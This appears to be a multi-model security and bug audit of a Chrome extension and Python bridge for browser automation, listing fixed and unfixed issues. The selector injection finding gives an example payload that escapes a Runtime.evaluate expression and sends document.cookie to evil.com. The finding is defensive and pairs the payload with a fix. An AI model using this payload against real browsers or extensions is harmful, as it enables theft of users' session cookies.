# 4-Model Audit Findings — 2026-07-22

Audited by: Codex, Kimi K2.7, Qwen 3.8 Max, GLM 5.2
Status: ✅ = fixed, ⚠️ = unfixed, acknowledged

## Bridge Server (hermes_bridge_server.py)

### 🔴 Frame Size DoS (unfixed)
Line 23: `length = struct.unpack('>Q', ...)[0]` — 64-bit unsigned, max ~18 exabytes.
`reader.readexactly(length)` will attempt to allocate → OOM kill server.
Fix: cap at 10MB: `if length > 10*1024*1024: raise ValueError('Frame too large')`

### ✅ WS fragmentation (fixed)
`read_frame()` now handles FIN bit and reassembles continuation frames.

### ✅ asyncio.Lock removed (fixed)
v3 bridge is lock-free — single ext_writer, no deadlock possible.

### 🟡 No WS read timeout (unfixed)
`while True: opcode, payload = await read_frame(reader)` has no timeout.
Fix: wrap in `asyncio.wait_for(read_frame(reader), timeout=60)`.

### 🟡 pending leak on TCP disconnect (unfixed)
`pending[rid]` not popped when TCP client disconnects mid-request.
Fix: `pending.pop(rid, None)` in TCP handler except block.

## Background.js (Extension)

### 🔴🔴 Selector Injection (unfixed)
5 handlers inject `msg.selector` directly into `Runtime.evaluate` expressions.
Only single-quote escaped. Backslash bypass works.
Example: `selector = "');fetch('https://evil.com/?'+document.cookie);('"` → cookie exfiltration.
Fix: use `JSON.stringify(msg.selector)` instead of manual escaping.

### ✅ Network.enable double-call (fixed)
Removed from `ensureDebuggerAttached` domains list.

### ✅ Force-detach (fixed)
Stale debugger auto-detached before re-attach.

### ✅ Pong handler (fixed)
`case 'pong': break;` added to switch statement.

### 🟡 activeDebuggerTabs lost on SW restart (unfixed)
MV3 terminates idle service workers, in-memory Map is empty on restart.
Fix: persist in `chrome.storage.session`.

## hermes_chrome.py & chrome_send.py

### 🔴 get_cookies() always returns empty (unfixed)
`r.get('result',{}).get('result',{}).get('value','')` — double `.result`.
Should be: `r.get('result',{}).get('value','')`.

### 🟡 Duplicate TCP code (unfixed)
`ChromeController._send()` and `ChromeBridge.send()` are ~90% identical.

### 🟡 7× repeated tab_id resolution (unfixed)
```python
if not tab_id:
    r = self.get_current_tab()
    tab_id = r.get('tabId')
```
Appears 7 times. Extract to `_resolve_tab_id()`.

## Integration

### Chrome 150 CDP port requirement
- `--remote-debugging-port=9222` alone NOT enough with default profile
- MUST add `--user-data-dir=<temp>` AND `--remote-allow-origins=*`
- This means CDP mode CANNOT share session with normal Chrome

### Playwright IPv6 issue
`localhost` resolves to `::1` on Windows, Chrome CDP only binds `127.0.0.1`.
Fix: always use `http://127.0.0.1:9222`.

### __pycache__ blocks extension
Python creates `__pycache__/` when running scripts in extension directory.
Chrome refuses to load extensions with directories starting with `_`.
Fix: `.gitignore` + always use `python -B`.
